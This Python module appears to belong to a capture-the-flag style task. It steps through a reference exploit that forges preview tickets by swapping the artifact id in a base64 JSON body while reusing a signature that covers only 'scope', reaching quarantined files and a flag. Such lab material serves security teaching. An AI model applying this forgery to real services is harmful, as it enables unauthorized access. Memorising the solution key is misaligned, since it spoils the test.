"""A generator that walks the reference exploit one HTTP call at a time.

Mirrors ``solver/reference_solution.py`` exactly, but pauses after each action
so a UI can show the request and response before sending the next one.

    gen = guided_walkthrough(username, password)
    label, explain, action = next(gen)             # first step
    obs = await env.step(action)
    label, explain, action = gen.send(obs)          # next step, using obs
    ...                                              # until StopIteration
"""

from __future__ import annotations

import json
import re
from collections.abc import Generator
from typing import Any

from grader.grader import load_rubric

Step = tuple[str, str, dict[str, Any]]


def guided_walkthrough(username: str, password: str) -> Generator[Step, dict[str, Any], None]:
    flag_re = re.compile(load_rubric().flag_regex)

    obs = yield (
        "List releases",
        "See what the portal exposes before authenticating.",
        {"action": "list_releases"},
    )

    obs = yield (
        "Log in",
        f"Authenticate as the low-privileged reviewer account ({username}).",
        {"action": "login", "username": username, "password": password},
    )

    obs = yield (
        "List artifacts",
        "Find one public artifact and the restricted (quarantined) ones.",
        {"action": "list_artifacts"},
    )
    artifacts = obs["body"]["artifacts"]
    public = next(a for a in artifacts if a["status"] == "available")
    restricted = [a["id"] for a in artifacts if a["status"] == "quarantined"]

    obs = yield (
        f"Mint a ticket for the public artifact ({public['id']})",
        "Request a legitimate preview ticket for a file we're allowed to read.",
        {"action": "mint", "artifact_id": public["id"]},
    )
    body_b64, _, signature = obs["body"]["ticket"].partition(".")

    obs = yield (
        "Decode the ticket body",
        "The ticket is base64(json).signature. Decode the JSON half to see its fields.",
        {"action": "b64", "op": "decode", "data": body_b64},
    )
    payload = json.loads(obs["body"]["result"])

    flag = None
    for artifact_id in restricted:
        payload["aid"] = artifact_id
        forged = json.dumps(payload, separators=(",", ":"), sort_keys=True)

        obs = yield (
            f"Re-encode the payload with aid={artifact_id}",
            "Swap the artifact id in the decoded JSON, then re-encode it.",
            {"action": "b64", "op": "encode", "data": forged},
        )

        obs = yield (
            "Relay the edited ticket, reusing the original signature",
            "The signature only ever covered `scope`, not `aid`, so it still verifies "
            "even though the artifact id changed underneath it.",
            {"action": "relay", "ticket": f"{obs['body']['result']}.{signature}"},
        )
        body = obs.get("body")
        match = flag_re.search(body.get("content", "")) if isinstance(body, dict) else None
        if match:
            flag = match.group(0)
            break

    if flag is None:
        return

    yield (
        "Submit the flag",
        "The server only accepts it if this attempt actually read the artifact that holds it.",
        {"action": "submit_flag", "flag": flag},
    )
